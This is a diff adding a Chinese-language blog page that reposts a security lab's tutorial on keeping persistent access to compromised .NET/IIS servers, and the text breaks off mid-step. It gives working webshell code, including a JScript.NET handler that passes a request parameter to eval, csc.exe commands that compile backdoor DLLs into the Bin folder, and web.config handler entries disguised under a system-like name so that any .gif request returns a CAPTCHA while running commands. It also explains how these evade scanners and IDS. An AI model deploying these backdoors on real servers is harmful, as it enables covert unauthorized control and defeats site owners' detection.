@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content=".NET下妙用DLL+处理映射实现后渗透权限维持 Ivan@360云影实验室 2018年07月18日 0x01 前言话说笔者在探索.NET实现一句话木马系列中在使用一般处理程序（当然也不限于ashx，asmx照样可用）的时候发现一处功能点可以自定义文件类型映射，再配合强大的csc和js编译器就可以完美的生成DLL并且作为WebShell后门程序，这就给攻击者在后渗透阶段权限维持提供了极大的便利，此">
+<meta name="keywords" content="权限维持">
+<meta property="og:type" content="article">
+<meta property="og:title" content=".net下的权限维持">
+<meta property="og:url" content="https://wh0ale.github.io/2019/02/17/2019-2-17-NET下的权限维持/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content=".NET下妙用DLL+处理映射实现后渗透权限维持 Ivan@360云影实验室 2018年07月18日 0x01 前言话说笔者在探索.NET实现一句话木马系列中在使用一般处理程序（当然也不限于ashx，asmx照样可用）的时候发现一处功能点可以自定义文件类型映射，再配合强大的csc和js编译器就可以完美的生成DLL并且作为WebShell后门程序，这就给攻击者在后渗透阶段权限维持提供了极大的便利，此">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/f9c33a586f0e0a6302d9f5a908e99e0d.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/4dcc5597303c760510c498168876b2ba.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/8a071677d9b279ad1bc1e251e7287dac.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/295324bdcffeef93adf9ac3811b93b27.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/bb580864eb7c54c99ce2ed96d9041fe0.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/b1b915f96edc634bddebf8dbe94d5850.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/133611b75b1d6d6fdac5dbcc78c01d00.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/d934ead9bfe319ad3acf1431d60a0b9a.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/a48ce47513bb5a2c1ecb7d820c582520.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/4cb15b6a64fa36e748f3580c5df7580e.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/a3754467c9dba9c3cc16370cf0bb1477.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/c5bb2b059f0277045798c9d53981674d.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/fbf19ebd283d6a39f2a7eec3841b9685.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/b7b6775f7a5ac0dd1cd4d8a9df813750.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/38e40fc44d587448f24837ce61583cc5.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/80d7867752b9266bb3768553496f4faf.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/29aadfd0a7afe3a898ba8c3523018e0c.png">
+<meta property="og:image" content="https://wh0ale.github.io/2019/02/17/img/net/9fecbc6ebf5c9aa63d86b902721ee595.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.261Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content=".net下的权限维持">
+<meta name="twitter:description" content=".NET下妙用DLL+处理映射实现后渗透权限维持 Ivan@360云影实验室 2018年07月18日 0x01 前言话说笔者在探索.NET实现一句话木马系列中在使用一般处理程序（当然也不限于ashx，asmx照样可用）的时候发现一处功能点可以自定义文件类型映射，再配合强大的csc和js编译器就可以完美的生成DLL并且作为WebShell后门程序，这就给攻击者在后渗透阶段权限维持提供了极大的便利，此">
+<meta name="twitter:image" content="https://wh0ale.github.io/2019/02/17/img/net/f9c33a586f0e0a6302d9f5a908e99e0d.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/02/17/2019-2-17-NET下的权限维持/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>.net下的权限维持 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/02/17/2019-2-17-NET下的权限维持/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">.net下的权限维持
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-02-17 00:00:00" itemprop="dateCreated datePublished" datetime="2019-02-17T00:00:00+08:00">2019-02-17</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">8.6k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">8 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p><strong>.NET下妙用DLL+处理映射实现后渗透权限维持</strong></p>
+<p><strong>Ivan@360云影实验室</strong></p>
+<p><strong>2018年07月18日</strong></p>
+<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>话说笔者在探索.NET实现一句话木马系列中在使用一般处理程序（当然也不限于ashx，asmx照样可用）的时候发现一处功能点可以自定义文件类型映射，再配合强大的csc和js编译器就可以完美的生成DLL并且作为WebShell后门程序，这就给攻击者在后渗透阶段权限维持提供了极大的便利，此后门可以实现任意后缀名访问，可以绕过一些IDS等防御产品，笔者从攻防的视角总结出一点姿势和大家分享一下。关于本文介绍到的权限维持的方法和步骤，笔者画了简易的流程图<br>，如下</p>
+<p><img src="../img/net/f9c33a586f0e0a6302d9f5a908e99e0d.png" alt></p>
+<p>大致分解一下权限维持的流程：首先攻击者选择权限维持的方式，这个时候有三种方法可供选择。</p>
+<table>
+<thead>
+<tr>
+<th>隐藏手段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>利用App_Code目录</td>
+<td>攻击者创建类文件并且在代码中写入一句话木马，在别处文件中实例化调用该类</td>
+</tr>
+<tr>
+<td>直接上传DLL</td>
+<td>攻击者本地制作一个DLL，可以选择性的加壳后上传到Bin目录下</td>
+</tr>
+<tr>
+<td>本地生成DLL</td>
+<td>攻击者利用WebShell在Bin目录下生成DLL后门</td>
+</tr>
+</tbody></table>
+<p>第一种方法考虑在App_Code目录下创建类文件且在代码中写入一句话木马，再回到根目录下寻找可追加代码的文件或者创建新的文件来调用类；第二种方法考虑在本地创建好一个DLL最好加上壳，再上传到Bin目录下后修改web.config文件增加handlers节点追加映射关系；第三种方法利用本地的环境生成DLL后修改映射访问；这样的好处显而易见，一句话或<br>大小马内容全部保存在DLL中，传统的文本查杀不奏效，并且访问的时候通过GIF后缀名访问回显的是一个图片验证码这样也能逃逸一些基于流量特征检测的IDS产品，下面分几个小节来详细说明实现的原理和步骤。</p>
+<h1 id="0x02-DLL型WebShell后门"><a href="#0x02-DLL型WebShell后门" class="headerlink" title="0x02 DLL型WebShell后门"></a>0x02 DLL型WebShell后门</h1><p>在介绍DLL后门之前需要介绍<br>.NET应用中两个特殊的目录，一个是App_Code目录、还有一个是Bin目录；它们的作用都是在多个Web<br>应用程序或多个页之间共享代码，App_Code 文件夹可以包含.vb、.cs<br>等扩展名的源代码文件,，在运行时将会自动对这些代码进行编译，Web<br>应用程序中的其他任何代码都可以访问到，笔者为了更好的演示效果，新建了一个App_Code目录，并且在About.aspx里实现了下面代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public partial class About : Page &#123; protected void Page_Load(object sender, EventArgs e) &#123; App_Code.apptest apptest = new App_Code.apptest(); HttpContext context = HttpContext.Current; apptest.ProcessRequest(context); &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Apptest.ashx中代码如下，作用是输出一句话Hello World , this is App_Code ProcessRequest</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class apptest : IHttpHandler &#123; public void ProcessRequest(HttpContext context) &#123; context.Response.Write(&quot;Hello World , this is App_Code ProcessRequest&quot;); &#125; public bool IsReusable &#123; get &#123; return false; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出的结果如下图</p>
+<p><img src="../img/net/4dcc5597303c760510c498168876b2ba.png" alt></p>
+<p><img src="../img/net/8a071677d9b279ad1bc1e251e7287dac.png" alt></p>
+<p>若Web应用里存在App_Code 目录，攻击者将一句话木马隐藏在该目录下的某个文件的方法里，恰好该方法可以被外界的其它的文件调用到，这样就可以实现一个较为隐蔽的后门程序，但这种隐蔽依旧会被D盾或者安全狗查杀到，显然这种方法不是最佳的选择，所以可以考虑放到Bin目录下的DLL文件中。</p>
+<p>至于.NET应用程序中Bin目录有何作用，先来段介绍：Bin文件夹中存放着已经编译的程序集，并且<br>在Web<br>应用程序任意处的其他代码会自动引用该文件夹。典型的示例是您为自定义类编译好的代码。您可以将编译后的程序集复制到Web应用程序的<br>Bin文件夹中，这样所有页都可以使用这个类。Bin文件夹中的程序集无需注册。只要.dll<br>文件存在于 Bin 文件夹中，.NET 就可以识别它。如果您更改了 .dll文件，并将它的新版本写入到了 Bin 文件夹中，则 .NET会检测到更新，并对随后的新页请求使用新版本的 .dll文件。接下来笔者假定服务器上已经存在一个WebShell，创建一个ashx的小马，注意代码是C#的即可，至于文件的后缀名可以任意指定，笔者指定为<code>C:\\inetpub\\wwwroot\\AdminWeb.txt</code>如下图</p>
+<p><img src="../img/net/295324bdcffeef93adf9ac3811b93b27.png" alt></p>
+<p>保存后到WebShell的CMD窗口下去调用csc.exe编译这个AdminWeb.txt，csc.exe是<br>.NET提供的可以在命令行下编译cs文件的工具，安装了.Net环境的主机csc.exe的默认位置在<br>C:\Windows\Microsoft.NET\Framework\[.NET具体版本号]目录下，例如笔者装了VS之后也会自动安装2.0/3.5/4.0版本，在命名行下输入<br><code>/?</code> 看到所有的帮助</p>
+<p><img src="../img/net/bb580864eb7c54c99ce2ed96d9041fe0.png" alt></p>
+<p>其中 /t:library<br>表示生成dll，/r参数表示引用DLL，-out参数表示生成dll的位置，这里很显然得放到Bin目录下，完整命令如下</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\</span></span><br><span class="line"><span class="function"><span class="title">csc.exe</span> /<span class="title">t:library</span> /<span class="title">r:System</span>.<span class="title">Web.dll</span> -<span class="title">out:C</span>:\<span class="title">inetpub</span>\<span class="title">wwwroot</span>\<span class="title">Bin</span>\<span class="title">AdminWeb.dll</span> <span class="title">C</span>:\<span class="title">inetpub</span>\<span class="title">wwwroot</span>\<span class="title">AdminWeb.txt</span></span></span><br></pre></td></tr></table></figure>
+
+<p>看到下列内容的输出，表示命令执行成功！</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">System32</span>&gt; <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\</span></span><br><span class="line"><span class="function"><span class="title">csc.exe</span> /<span class="title">t:library</span> /<span class="title">r:System</span>.<span class="title">Web.dll</span> -<span class="title">out:C</span>:\<span class="title">inetpub</span>\<span class="title">wwwroot</span>\<span class="title">Bin</span>\<span class="title">AdminWeb.dll</span> <span class="title">C</span>:\<span class="title">inetpub</span>\<span class="title">wwwroot</span>\<span class="title">AdminWeb.txt</span> <span class="title">Microsoft</span> (<span class="title">R</span>) <span class="title">Visual</span> <span class="title">C</span># <span class="title">Compiler</span> <span class="title">version</span> 4.7.2053.0 <span class="title">for</span> <span class="title">C</span># 5 <span class="title">Copyright</span> (<span class="title">C</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>. <span class="title">All</span> <span class="title">rights</span> <span class="title">reserved</span>. <span class="title">This</span> <span class="title">compiler</span> <span class="title">is</span> <span class="title">provided</span> <span class="title">as</span> <span class="title">part</span> <span class="title">of</span> <span class="title">the</span> <span class="title">Microsoft</span> (<span class="title">R</span>) .<span class="title">NET</span> <span class="title">Framework</span>, <span class="title">but</span> <span class="title">only</span> <span class="title">supports</span> <span class="title">language</span> <span class="title">versions</span> <span class="title">up</span> <span class="title">to</span> <span class="title">C</span># 5, <span class="title">which</span> <span class="title">is</span> <span class="title">no</span> <span class="title">longer</span> <span class="title">the</span> <span class="title">latest</span> <span class="title">version</span>. <span class="title">For</span> <span class="title">compilers</span> <span class="title">that</span> <span class="title">support</span> <span class="title">newer</span> <span class="title">versions</span> <span class="title">of</span> <span class="title">the</span> <span class="title">C</span># <span class="title">programming</span> <span class="title">language</span>, <span class="title">see</span> <span class="title">http</span>://<span class="title">go.microsoft.com</span>/<span class="title">fwlink</span>/?<span class="title">LinkID</span>=533240</span></span><br></pre></td></tr></table></figure>
+
+<p>WebShell执行结果如图</p>
+<p><img src="../img/net/b1b915f96edc634bddebf8dbe94d5850.png" alt></p>
+<p>再跳转到站点Bin目录下看到成功创建了想要的AdminWeb.dll文件，至此DLL版本的后门程序已经制作完成。</p>
+<p><img src="../img/net/133611b75b1d6d6fdac5dbcc78c01d00.png" alt></p>
+<p>到了这步攻击者肯定会想到在一个已经存在的文件中去调用这个DLL里的方法，笔者新建了c.aspx文件，里面写上一段代码去实例化DLL里的AdminWeb类会触发其构造方法，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt; &lt;script runat=&quot;server&quot;&gt;AdminWeb adminWeb = new AdminWeb();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>预览后得到下图结果，在实例化类的过程中自动调用了构造方法，执行了DOS下的set命令。</p>
+<p><img src="../img/net/d934ead9bfe319ad3acf1431d60a0b9a.png" alt></p>
+<p>按照这样的思路在服务器上已经找不到ASPX马儿的任何特征，最多可以发现新建的c.aspx文件可疑，但调用的方法名看上去很平常，即使管理员用D盾或者安全狗也扫不出任何的蛛丝马迹，也实现了一种后门权限维持的方法。但笔者还不满足，接下来还要介绍一种更加隐蔽的方法。</p>
+<h1 id="0x03-HttpHandler映射"><a href="#0x03-HttpHandler映射" class="headerlink" title="0x03 HttpHandler映射"></a>0x03 HttpHandler映射</h1><p>笔者在第一篇介绍ashx中我们提到过<br>ISAPI，它是根据文件名后缀把不同的请求转交给不同的处理程序。几乎一大半的文件访问都交给<br>aspnet_isapi.dll<br>去处理了，很明显aspnet_isapi.dll对不同的请求采取不同的处理方式，查看C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config配置定义，可以知道ashx是可以自定义配置实现映射关系，例如下面的配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32&quot; path=&quot;*.ashx&quot; verb=&quot;*&quot; type=&quot;System.Web.UI.SimpleHandlerFactory&quot; validate=&quot;True&quot; preCondition=&quot;integratedMode&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<p>配置项中path属性是必选的，它的作用是指定路径可以包含单个URL或者简单的通配符字符串如<br>*.ashx ; 其它的属性参考下表</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>name</td>
+<td>处理映射程序的名称</td>
+</tr>
+<tr>
+<td>type</td>
+<td>必选的属性，指定逗号分割的类/程序集组合，一般对应的就是Bin目录下的DLL</td>
+</tr>
+<tr>
+<td>verb</td>
+<td>必选的属性，可以是GET/POST/PUT；也可以是脚本映射如通配符*</td>
+</tr>
+<tr>
+<td>preCondition</td>
+<td>可选属性，可以是集成模式（Integrated）/ 经典模式（Classic）</td>
+</tr>
+<tr>
+<td>validate</td>
+<td>可选的属性，一般为true</td>
+</tr>
+</tbody></table>
+<p>下面笔者演示将通过浏览器访问验证码图片达到命令执行的效果：首先name属性设置为一个伪装成正常处理程序的名字PageHandlerFactory-ISAPI-2.0-32；path属性设置为任意名称的gif图片，这里是实现的验证码；verb属性为*表示任意请求都可以；type是最重要的命名空间.类名<br>；preCondition属性设置为集成模式（IIS7性能好）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;handlers&gt; &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32&quot; path=&quot;*.gif&quot; verb=&quot;*&quot; type=&quot;IsapiModules.Handler&quot; preCondition=&quot;integratedMode&quot;/&gt; &lt;/handlers&gt;</span><br></pre></td></tr></table></figure>
+
+<p>笔者编写了一个C#的小马，保存名称为IsapiModules.Handler.cs<br>，实现三个功能，一是生成验证码，二是创建一个aspx的一句话文件，三是执行cmd命令；生成验证码的目的是为了更好的隐藏自己，从HTTP返回的数据里输出的是一张图片文件，代码片段如下图</p>
+<p><img src="../img/net/a48ce47513bb5a2c1ecb7d820c582520.png" alt></p>
+<p>再在命令行下生成 IsapiModules.Handler.dll，生成DLL的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library /r:System.Web.dll -out:C:\inetpub\wwwroot\Bin\IsapiModules.Handler.dll C:\inetpub\wwwroot\IsapiModules.Handler.cs</span><br></pre></td></tr></table></figure>
+
+<p><img src="../img/net/4cb15b6a64fa36e748f3580c5df7580e.png" alt></p>
+<p>最后只需要在站点根目录下的Web.config文件新增handlers/httpHandlers节点 ;<br>注意在IIS6添加如下配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;system.web&gt; &lt;httpHandlers&gt; &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32&quot; path=&quot;*.gif&quot; verb=&quot;*&quot; type=&quot; IsapiModules.Handler&quot;/&gt; &lt;/httpHandlers&gt; &lt;/system.web&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在IIS7集成模式下这样配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;system.webServer&gt; &lt;handlers&gt; &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32&quot; path=&quot;*.gif&quot; verb=&quot;*&quot; type=&quot;IsapiModules.Handler&quot; preCondition=&quot;integratedMode&quot;/&gt; &lt;/handlers&gt; &lt;/system.webServer&gt;</span><br></pre></td></tr></table></figure>
+
+<p>配置好了之后，IIS7服务管理器映射列表中就会注册笔者自定义的映射程序<br><code>PageHandlerFactory-ISAPI-2.0-32</code>，名字和系统的<br><code>PageHandlerFactory-ISAPI-2.0</code>很接近，但确实是一个伪装者</p>
+<p><img src="../img/net/a3754467c9dba9c3cc16370cf0bb1477.png" alt></p>
+<p>打开浏览器随便输入<a href="http://ip/anything.gif?a=c&amp;p=cmd.txt&amp;c=ipconfig" target="_blank" rel="noopener">http://ip/anything.gif?a=c&amp;p=cmd.txt&amp;c=ipconfig</a><br>，这个时候界面是一个验证码图片，伪装的很好，IDS也不好检测。</p>
+<p><img src="../img/net/c5bb2b059f0277045798c9d53981674d.png" alt></p>
+<p>这个时候已经在服务器上生成了cmd.txt，得到IP配置信息！</p>
+<p><img src="../img/net/fbf19ebd283d6a39f2a7eec3841b9685.png" alt></p>
+<p>试想留下这样一个完美的后门程序，参数加不加的时候都会输出验证码图片，这样就可以绕过一些终端产品和流量检测，达到了很好的隐藏效果。</p>
+<h1 id="0x04-菜刀一句话的隐藏"><a href="#0x04-菜刀一句话的隐藏" class="headerlink" title="0x04 菜刀一句话的隐藏"></a>0x04 菜刀一句话的隐藏</h1><p>实现菜刀可用的一句话就必须要引入Jscript.Net，而且需要利用.NET<br>FrameWork自带的jsc.exe去编译js脚本。有关jsc.exe的命令可以参考</p>
+<p><a href="https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/7435xtz6(v=vs.100)" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/7435xtz6(v=vs.100)</a></p>
+<p>笔者新建IsapiModu1e.Handler.js，实现代码如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> System;</span><br><span class="line"><span class="keyword">import</span> System.Web;</span><br><span class="line"><span class="keyword">import</span> System.IO;</span><br><span class="line">package IsapiModu1e&#123; public <span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="title">implements</span> <span class="title">IHttpHandler</span></span>&#123; <span class="function"><span class="keyword">function</span> <span class="title">IHttpHandler</span>.<span class="title">ProcessRequest</span>(<span class="params">context : HttpContext</span>)</span>&#123; context.Response.Write(<span class="string">"&lt;H1&gt;Just for Research Learning, Do Not Abuse It! Written By &lt;a href='https://github.com/Ivan1ee'\&gt;Ivan1ee\&lt;/a&gt;&lt;/H1&gt;"</span>) <span class="keyword">var</span> I = context; <span class="keyword">var</span> Request = I.Request; <span class="keyword">var</span> Response = I.Response; <span class="keyword">var</span> Server = I.Server; <span class="built_in">eval</span>(context.Request[<span class="string">"Ivan"</span>]); &#125; <span class="function"><span class="keyword">function</span> <span class="title">get</span> <span class="title">IHttpHandler</span>.<span class="title">IsReusable</span>(<span class="params"></span>) : <span class="title">Boolean</span></span>&#123; <span class="keyword">return</span> <span class="literal">true</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在WebShell里调用jsc.exe编译js脚本，输入</p>
